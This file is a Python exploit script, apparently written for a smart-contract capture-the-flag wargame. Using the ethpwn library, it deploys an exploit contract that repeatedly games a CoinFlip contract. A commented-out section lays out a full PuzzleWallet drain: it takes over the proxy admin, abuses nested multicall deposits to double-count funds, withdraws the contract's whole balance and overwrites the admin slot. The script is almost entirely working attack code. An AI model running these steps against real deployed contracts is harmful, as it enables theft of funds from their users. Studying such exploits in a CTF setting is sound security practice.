#!/usr/bin/env python3

import sys
from time import sleep
from ethpwn import *


MY_WALLET = get_wallet_by_name('Laptop CTF Metamask')
assert MY_WALLET is not None
context.default_from_addr = MY_WALLET.address
context.default_signing_key = MY_WALLET.private_key

context.log_level = 'DEBUG'

PROXY_ADDR = sys.argv[1]

CONTRACT_METADATA.add_contracts_from_solidity_files(['./exploit_coin_flip.sol'])

coin_flip = CONTRACT_METADATA['CoinFlip'].get_contract_at(PROXY_ADDR)

with CONTRACT_METADATA['ExpCoinFlip'].deploy_destructible(PROXY_ADDR) as (tx_hash, target):
    print(f"Exploit contract is at {target.address}")

    for i in range(10):
        sleep(2)
        tx_hash, tx_receipt = transact(target.functions.exploit())
        print(f"Received exploit receipt (block_number={tx_receipt['blockNumber']}): {tx_receipt.o}")







# KILL_AMOUNT = context.w3.eth.get_balance(PROXY_ADDR)

# print("KILL_AMOUNT: {} [{} ether]".format(KILL_AMOUNT, context.w3.from_wei(KILL_AMOUNT, 'ether')))

# CONTRACT_METADATA.add_solidity_files(['./exploit_puzzle_wallet.sol'])

# target = CONTRACT_METADATA['PuzzleProxy'].get_contract_at(PROXY_ADDR)

# tx_hash, tx_receipt = transact(target.functions.proposeNewAdmin(context.default_from_addr))
# print(f"Received proposeNewAdmin receipt (block_number={tx_receipt['blockNumber']})")
# sleep(3)

# tx_hash, tx_receipt = transact(target.functions.addToWhitelist(context.default_from_addr))
# print(f"Received addToWhitelist receipt (block_number={tx_receipt['blockNumber']})")
# sleep(3)


# deposit_calldata = target.encodeABI(fn_name="deposit")
# multicall_calldata = target.encodeABI(fn_name="multicall", args=[[deposit_calldata,]])

# tx_hash, tx_receipt = transact(
#     target.functions.multicall([deposit_calldata, multicall_calldata]),
#     value=KILL_AMOUNT  # deposit KILL_AMOUNT, so we can withdraw KILL_AMOUNT*2, draining the contract
# )
# print(f"Received multicall receipt (block_number={tx_receipt['blockNumber']})")
# sleep(3)

# tx_hash, tx_receipt = transact(target.functions.execute(MY_WALLET.address, KILL_AMOUNT * 2, "0x"))
# print(f"Received execute receipt (block_number={tx_receipt['blockNumber']})")
# sleep(3)

# tx_hash, tx_receipt = transact(
#     target.functions.setMaxBalance(int(MY_WALLET.address, 16))
# )
# print(f"Received setMaxBalance receipt (block_number={tx_receipt['blockNumber']})")
# sleep(3)